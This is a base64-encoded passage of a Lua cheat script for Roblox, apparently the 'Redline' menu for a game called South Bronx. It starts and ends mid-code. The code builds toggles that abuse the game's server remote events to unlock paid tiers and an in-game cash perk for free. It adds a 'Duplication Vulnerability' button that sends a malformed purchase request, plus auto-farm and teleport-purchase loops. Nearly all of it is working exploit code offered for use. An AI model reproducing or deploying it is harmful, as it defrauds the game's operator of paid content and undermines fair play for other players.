ZmlnLlNvdXRoX0Jyb254LkxvY2FsUGxheWVyX0NvbmZpZy5EZWxldGVLZXkgPSBsaWJyYXJ5LmZsYWdzWyJEZWxldGVPbktleV9Tb3V0aEJyb254Il0ua2V5CiAgICAgICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgICAgIFRlbGVwb3J0TWV0aG9kU2VjdGlvbiA9IExvY2FsUGxheWVyQ29sdW1uOnNlY3Rpb24oe25hbWUgPSAiVGVsZXBvcnRhdGlvbiBNZXRob2QiLCBzaWRlID0gImxlZnQiLCBzaXplID0gMC4xNzUsIGljb24gPSBHZXRJbWFnZSgiV3JlbmNoLnBuZyIpfSkKCiAgICAgICAgICAgICAgICBUZWxlcG9ydE1ldGhvZFNlY3Rpb246ZHJvcGRvd24oe25hbWUgPSAiU2VsZWN0IE1ldGhvZCIsIGZsYWcgPSAiVGVsZXBvcnRNZXRob2RfU0IiLCB3aWR0aCA9IDEwMCwgaXRlbXMgPSB7IkRpcnQgQmlrZSIsICJEYW1hZ2UiLCAiVHdlZW4ifSwgc2VwZXJhdG9yID0gZmFsc2UsIG11bHRpID0gZmFsc2UsIGRlZmF1bHQgPSAiRGFtYWdlIiwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICBDb25maWcuU291dGhfQnJvbnguVGVsZXBvcnRNZXRob2QgPSBzdGF0ZQogICAgICAgICAgICAgICAgZW5kfSkKCiAgICAgICAgICAgICAgICBMb2NhbFBsYXllckNvbHVtbiA9IExvY2FsUGxheWVyVGFiOmNvbHVtbih7fSkKCiAgICAgICAgICAgICAgICBsb2NhbCBWdWxuU2VjdGlvbiA9IExvY2FsUGxheWVyQ29sdW1uOnNlY3Rpb24oe25hbWUgPSAiVnVsbmVyYWJpbGl0eSBTZWN0aW9uIiwgc2lkZSA9ICJyaWdodCIsIHNpemUgPSAwLjIzICwgaWNvbiA9IEdldEltYWdlKCJ1bmxvY2tlZC5wbmciKX0pCgogICAgICAgICAgICAgICAgbG9jYWwgX093bmVkSG90Q2hpcHMgPSBMb2NhbFBsYXllcjpHZXRBdHRyaWJ1dGUoIkV4dHJhSG90Q2hpcHNNb25leUVuYWJsZWQiKQoKICAgICAgICAgICAgICAgIGxvY2FsIE93bmVkSG90Q2hpcHMgPSBfT3duZWRIb3RDaGlwcwoKICAgICAgICAgICAgICAgIGxvY2FsIF9UaWVycyA9IHsKICAgICAgICAgICAgICAgICAgICBbIlRJRVJfMSJdID0gTG9jYWxQbGF5ZXI6R2V0QXR0cmlidXRlKCJUSUVSXzEiKTsKICAgICAgICAgICAgICAgICAgICBbIlRJRVJfMiJdID0gTG9jYWxQbGF5ZXI6R2V0QXR0cmlidXRlKCJUSUVSXzIiKTsKICAgICAgICAgICAgICAgICAgICBbIlRJRVJfMyJdID0gTG9jYWxQbGF5ZXI6R2V0QXR0cmlidXRlKCJUSUVSXzMiKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBsb2NhbCBUaWVycyA9IHsKICAgICAgICAgICAgICAgICAgICBbIlRJRVJfMSJdID0gTG9jYWxQbGF5ZXI6R2V0QXR0cmlidXRlKCJUSUVSXzEiKTsKICAgICAgICAgICAgICAgICAgICBbIlRJRVJfMiJdID0gTG9jYWxQbGF5ZXI6R2V0QXR0cmlidXRlKCJUSUVSXzIiKTsKICAgICAgICAgICAgICAgICAgICBbIlRJRVJfMyJdID0gTG9jYWxQbGF5ZXI6R2V0QXR0cmlidXRlKCJUSUVSXzMiKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBsb2NhbCBfU2NyaXB0TG9hZGVkID0gZmFsc2U7CgogICAgICAgICAgICAgICAgVnVsblNlY3Rpb246dG9nZ2xlKHtuYW1lID0gIkZyZWUgVGllciAxLCAyIGFuZCAzIiwgZGVmYXVsdCA9IGZhbHNlLCBmbGFnID0gIkZyZWVfVGllcnMiLCB0eXBlID0gJ3RvZ2dsZScsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IF9TY3JpcHRMb2FkZWQgdGhlbiByZXR1cm4gZW5kCgogICAgICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gVGllcnMgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgX1RpZXJzW0luZGV4XSB0aGVuIGNvbnRpbnVlIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgQXJndW1lbnRzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgWzFdID0gIlVwZGF0ZVNldHRpbmdBdHRyaWJ1dGUiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgWzJdID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsiQXR0cmlidXRlIl0gPSBJbmRleCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbIkVuYWJsZWQiXSA9IFRpZXJzW0luZGV4XQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBGaXJlU2VydmVyKFJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiUmVtb3RlRXZlbnRzIik6V2FpdEZvckNoaWxkKCJDbGllbnRFZmZlY3RzIiksIHRhYmxlLnVucGFjayhBcmd1bWVudHMpKSAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIFRpZXJzW0luZGV4XSA9IG5vdCBUaWVyc1tJbmRleF0KICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZH0pCgogICAgICAgICAgICAgICAgVnVsblNlY3Rpb246dG9nZ2xlKHtuYW1lID0gIkZyZWUgRXh0cmEgSG90IENoaXBzIENhc2giLCBkZWZhdWx0ID0gZmFsc2UsIGZsYWcgPSAiRnJlZV9DaGlwcyIsIHR5cGUgPSAndG9nZ2xlJywgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICBpZiBub3QgX1NjcmlwdExvYWRlZCB0aGVuIHJldHVybiBlbmQKCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgQXJndW1lbnRzID0gewogICAgICAgICAgICAgICAgICAgICAgICBbMV0gPSAiVXBkYXRlU2V0dGluZ0F0dHJpYnV0ZSIsCiAgICAgICAgICAgICAgICAgICAgICAgIFsyXSA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsiQXR0cmlidXRlIl0gPSAiRXh0cmFIb3RDaGlwc01vbmV5RW5hYmxlZCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBbIkVuYWJsZWQiXSA9IE93bmVkSG90Q2hpcHMKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBGaXJlU2VydmVyKFJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiUmVtb3RlRXZlbnRzIik6V2FpdEZvckNoaWxkKCJDbGllbnRFZmZlY3RzIiksIHRhYmxlLnVucGFjayhBcmd1bWVudHMpKSAgICAgICAKCiAgICAgICAgICAgICAgICAgICAgT3duZWRIb3RDaGlwcyA9IG5vdCBPd25lZEhvdENoaXBzCiAgICAgICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgICAgIGxvY2FsIEZhcm1TZWN0aW9uID0gTG9jYWxQbGF5ZXJDb2x1bW46c2VjdGlvbih7bmFtZSA9ICJBdXRvIEZhcm1pbmcgU2VjdGlvbiIsIHNpZGUgPSAicmlnaHQiLCBzaXplID0gMC41NCwgaWNvbiA9IEdldEltYWdlKCJXaGVhdHQucG5nIil9KQoKICAgICAgICAgICAgICAgIEZhcm1TZWN0aW9uOnRvZ2dsZSh7bmFtZSA9ICJBdXRvLUZhcm0gQ2FyZHMiLCBkZWZhdWx0ID0gZmFsc2UsIGZsYWcgPSAiQ2FyZF9BdXRvX0Zhcm0iLCB0eXBlID0gInRvZ2dsZSIsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpIGlmIG5vdCBfU2NyaXB0TG9hZGVkIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuU291dGhfQnJvbnguT3duZWRCaWtlID09ICJVbmtub3duIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBCaWtlID0gRmluZF9CaWtlKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEJpa2UgPT0gbmlsIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZTpXYWl0Rm9yQ2hpbGQoIlJlbW90ZUV2ZW50cyIpOldhaXRGb3JDaGlsZCgiRGVhbGVyc2hpcGludGVyYWN0aW9uIik6RmlyZVNlcnZlcigiU3Bhd24iLCAiRGlydEJpa2UiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJpa2UgPSBGaW5kX0Jpa2UoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEJpa2UgPT0gbmlsIHRoZW4gQ29uZmlnLlNvdXRoX0Jyb254Lk93bmVkQmlrZSA9ICJObyIgZWxzZSBDb25maWcuU291dGhfQnJvbnguT3duZWRCaWtlID0gIlllcyIgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlNvdXRoX0Jyb254Lk93bmVkQmlrZSA9ICJZZXMiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBDb25maWcuU291dGhfQnJvbnguRmFybWluZ1V0aWxpdGllcy5DYXJkRmFybSA9IHN0YXRlCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHN0YXRlIHRoZW4gU3RhcnRfQ2FyZEZhcm0oKSBlbHNlIFN0b3BfQ2FyZEZhcm0oKSBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgICAgIEZhcm1TZWN0aW9uOnRvZ2dsZSh7bmFtZSA9ICJBdXRvLUZhcm0gQm94ZXMiLCBkZWZhdWx0ID0gZmFsc2UsIGZsYWcgPSAiQm94X0F1dG9fRmFybSIsIHR5cGUgPSAidG9nZ2xlIiwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICBpZiBub3QgX1NjcmlwdExvYWRlZCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICBDb25maWcuU291dGhfQnJvbnguRmFybWluZ1V0aWxpdGllcy5Cb3hGYXJtID0gc3RhdGUKICAgICAgICAgICAgICAgICAgICBpZiBzdGF0ZSB0aGVuIFN0YXJ0X0JveEZhcm0oKSBlbHNlIFN0b3BfQm94RmFybSgpIGVuZAogICAgICAgICAgICAgICAgZW5kfSkKCiAgICAgICAgICAgICAgICBGYXJtU2VjdGlvbjp0b2dnbGUoe25hbWUgPSAiQXV0by1GYXJtIENoaXBzIiwgZGVmYXVsdCA9IGZhbHNlLCBmbGFnID0gIkNoaXBfQXV0b19GYXJtIiwgdHlwZSA9ICJ0b2dnbGUiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKSBpZiBub3QgX1NjcmlwdExvYWRlZCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgQ29uZmlnLlNvdXRoX0Jyb254Lk93bmVkQmlrZSA9PSAiVW5rbm93biIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgQmlrZSA9IEZpbmRfQmlrZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBCaWtlID09IG5pbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2U6V2FpdEZvckNoaWxkKCJSZW1vdGVFdmVudHMiKTpXYWl0Rm9yQ2hpbGQoIkRlYWxlcnNoaXBpbnRlcmFjdGlvbiIpOkZpcmVTZXJ2ZXIoIlNwYXduIiwgIkRpcnRCaWtlIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCaWtlID0gRmluZF9CaWtlKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBCaWtlID09IG5pbCB0aGVuIENvbmZpZy5Tb3V0aF9Ccm9ueC5Pd25lZEJpa2UgPSAiTm8iIGVsc2UgQ29uZmlnLlNvdXRoX0Jyb254Lk93bmVkQmlrZSA9ICJZZXMiIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbmZpZy5Tb3V0aF9Ccm9ueC5Pd25lZEJpa2UgPSAiWWVzIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlNvdXRoX0Jyb254LkZhcm1pbmdVdGlsaXRpZXMuQ2hpcEZhcm0gPSBzdGF0ZQogICAgICAgICAgICAgICAgICAgICAgICBpZiBzdGF0ZSB0aGVuIFN0YXJ0X0NoaXBGYXJtKCkgZWxzZSBTdG9wX0NoaXBGYXJtKCkgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgZW5kfSkKCiAgICAgICAgICAgICAgICBGYXJtU2VjdGlvbjp0b2dnbGUoe25hbWUgPSAiQXV0by1GYXJtIE1hcnNobWFsbG93cyIsIGRlZmF1bHQgPSBmYWxzZSwgZmxhZyA9ICJNYXJzaG1hbGxvd19BdXRvX0Zhcm0iLCB0eXBlID0gInRvZ2dsZSIsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpIGlmIG5vdCBfU2NyaXB0TG9hZGVkIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuU291dGhfQnJvbnguT3duZWRCaWtlID09ICJVbmtub3duIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBCaWtlID0gRmluZF9CaWtlKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEJpa2UgPT0gbmlsIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZTpXYWl0Rm9yQ2hpbGQoIlJlbW90ZUV2ZW50cyIpOldhaXRGb3JDaGlsZCgiRGVhbGVyc2hpcGludGVyYWN0aW9uIik6RmlyZVNlcnZlcigiU3Bhd24iLCAiRGlydEJpa2UiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJpa2UgPSBGaW5kX0Jpa2UoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEJpa2UgPT0gbmlsIHRoZW4gQ29uZmlnLlNvdXRoX0Jyb254Lk93bmVkQmlrZSA9ICJObyIgZWxzZSBDb25maWcuU291dGhfQnJvbnguT3duZWRCaWtlID0gIlllcyIgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlNvdXRoX0Jyb254Lk93bmVkQmlrZSA9ICJZZXMiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBDb25maWcuU291dGhfQnJvbnguRmFybWluZ1V0aWxpdGllcy5NYXJzaG1hbGxvd0Zhcm0gPSBzdGF0ZQogICAgICAgICAgICAgICAgICAgICAgICBpZiBzdGF0ZSB0aGVuIFN0YXJ0X01hcnNobWFsbG93RmFybSgpIGVsc2UgU3RvcF9NYXJzaG1hbGxvd0Zhcm0oKSBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgICAgIGxvY2FsIF9NYXJzaE1hbGxvd0Ryb3Bkb3duOwoKICAgICAgICAgICAgICAgIF9NYXJzaE1hbGxvd0Ryb3Bkb3duID0gRmFybVNlY3Rpb246c2xpZGVyKHtuYW1lID0gIk1hcnNobWFsbG93IEFtb3VudCAtICQ5NTAiLCBmbGFnID0gIk1hcnNobWFsbG93X0Ftb3VudCIsIG1pbiA9IDEsIG1heCA9IDUwLCBkZWZhdWx0ID0gNSwgc3VmZml4ID0gIiIsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlNvdXRoX0Jyb254LkZhcm1pbmdVdGlsaXRpZXMuTWFyc2htYWxsb3dJbmNyZW1lbnQgPSBzdGF0ZQoKICAgICAgICAgICAgICAgICAgICBpZiBfTWFyc2hNYWxsb3dEcm9wZG93biB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIF9NYXJzaE1hbGxvd0Ryb3Bkb3duLmNoYW5nZXRleHQoc3RyaW5nLmZvcm1hdCgiTWFyc2htYWxsb3cgQW1vdW50IC0gJCVzIiwgKHN0YXRlICogMTkwKSkpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgICAgIEZhcm1TZWN0aW9uOmxhYmVsKHt3cmFwcGVkID0gdHJ1ZSwgbmFtZSA9ICJZb3UgbXVzdCBvd24gYSBob3VzZSB3aXRoIHBvdHMgdG8gdXNlIHRoZSBtYXJzaG1hbGxvdyBmYXJtISJ9KQoKICAgICAgICAgICAgICAgIGxvY2FsIER1cGVTZWN0aW9uID0gTG9jYWxQbGF5ZXJDb2x1bW46c2VjdGlvbih7bmFtZSA9ICJEdXBsaWNhdGlvbiBTZWN0aW9uIiwgc2lkZSA9ICJyaWdodCIsIHNpemUgPSAwLjIsIGljb24gPSAicmJ4YXNzZXRpZDovLzEzOTYyODIwMjU3NjUxMSJ9KQoKICAgICAgICAgICAgICAgIER1cGVTZWN0aW9uOmJ1dHRvbih7bmFtZSA9ICJEdXBsaWNhdGlvbiBWdWxuZXJhYmlsaXR5IiwgY2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgRmlyZVNlcnZlcihSZXBsaWNhdGVkU3RvcmFnZS5SZW1vdGVFdmVudHMuUHVyY2hhc2VJdGVtLCAnU2hvZXMnLCAnWVogU2xpZGVzJywgJ1wyNTUnKQogICAgICAgICAgICAgICAgZW5kfSkKCiAgICAgICAgICAgICAgICBfU2NyaXB0TG9hZGVkID0gdHJ1ZQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGRvIC0tIFxcIFRlbGVwb3J0cwogICAgICAgICAgICAgICAgbG9jYWwgTG9jYXRpb25fTmFtZXMgPSB7IkRpcnR5IEhvYm8g8J+SqSI7ICJBY3RpdmUgQVRNIPCfj6cifQoKICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gQ29uZmlnLlNvdXRoX0Jyb254LkxvY2F0aW9ucyBkbwogICAgICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChMb2NhdGlvbl9OYW1lcywgSW5kZXgpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICB0YWJsZS5zb3J0KExvY2F0aW9uX05hbWVzKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBQdXJjaGFzZUd1bkNvbHVtbiA9IFB1cmNoYXNlR3VuVGFiOmNvbHVtbih7fSkKCiAgICAgICAgICAgICAgICBsb2NhbCBXZWFwb25MaXN0U2VjdGlvbiA9IFB1cmNoYXNlR3VuQ29sdW1uOnNlY3Rpb24oe25hbWUgPSAiUHVyY2hhc2UgU2VsZWN0ZWQgSXRlbSIsIHNpZGUgPSAibGVmdCIsIHNpemUgPSAxLCBpY29uID0gR2V0SW1hZ2UoIkNhc2gucG5nIil9KQoKICAgICAgICAgICAgICAgIFdlYXBvbkxpc3RTZWN0aW9uOmxpc3Qoe2ZsYWcgPSAiUHVyY2hhc2VTZWxlY3RlZEl0ZW1fU291dGhCcm9ueCIsIG9wdGlvbnMgPSBDb25maWcuU291dGhfQnJvbnguR3VucywgY2FsbGJhY2sgPSBmdW5jdGlvbih2KQogICAgICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdiB0aGVuIHJldHVybiBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIENvbmZpZy5Tb3V0aF9Ccm9ueC5TZWxlY3RlZF9JdGVtID0gdG9zdHJpbmcodikKCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHNlbGYgPSBzdHJpbmcubWF0Y2goQ29uZmlnLlNvdXRoX0Jyb254LlNlbGVjdGVkX0l0ZW0sICJeKC4qKSAlLSIpOwoKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgRGlkbnRCdXkgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHN1YywgZXJyID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZiA9IHNlbGY6bWF0Y2goIl4lcyooLi0pJXMqJCIpOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFByb21wdENGcmFtZSA9IEd1blBvc2l0aW9uW3NlbGZdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgT2xkQ0ZyYW1lID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSXRlbVJlY2VpZXZlZCA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIENoZWNrID0gTG9jYWxQbGF5ZXIuQmFja3BhY2suQ2hpbGRBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKENoaWxkKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b3N0cmluZyhDaGlsZCkgPT0gdG9zdHJpbmcoc2VsZikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSXRlbVJlY2VpZXZlZCA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJdGVtUmVjZWlldmVkID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0IFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpXYWl0KCkgdW50aWwgSXRlbVJlY2VpZXZlZCA9PSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ2hlY2s6RGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgVGVsZXBvcnRfU3RhdHVzID0gVGVsZXBvcnQoUHJvbXB0Q0ZyYW1lKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIFRlbGVwb3J0X1N0YXR1cyA9PSAiRmFpbGVkIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeS5ub3RpZmljYXRpb25zOmNyZWF0ZV9ub3RpZmljYXRpb24oewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYW1lID0gIlJlZGxpbmUiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmZvID0gYEZhaWxlZCB0byBwdXJjaGFzZSB7c2VsZn0hYCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlmZXRpbWUgPSA3LjUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEaWRudEJ1eSA9IHRydWUKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOldhaXQoKSB1bnRpbCBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2VhdFBhcnQgPT0gbmlsCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIEluZGV4ID0gMSwgQ29uZmlnLlNvdXRoX0Jyb254Lkl0ZW1fQW1vdW50IGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXByb3hpbWl0eXByb21wdChXb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoIlByb21wdFB1cmNoYXNlcyIpW3NlbGZdLnByb3hwcm9tcHQ6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJQcm94aW1pdHlQcm9tcHQiKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6V2FpdCgpIHVudGlsIEl0ZW1SZWNlaWV2ZWQgPT0gdHJ1ZQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6V2FpdCgpIHVudGlsIFRlbGVwb3J0X1N0YXR1cyA9PSAiU3VjY2VzcyIKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMS41KQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRlbGVwb3J0KE9sZENGcmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKHNlbGYpIGFuZCBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHNlbGYpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYW1lID0gIlJlZGxpbmUiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluZm8gPSBgRmFpbGVkIHRvIHB1cmNoYXNlIHtzZWxmfSFgLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpZmV0aW1lID0gNy41CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBEaWRudEJ1eSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBzdWMgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbmFtZSA9ICJSZWRsaW5lIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5mbyA9IGBTdWNjZXNz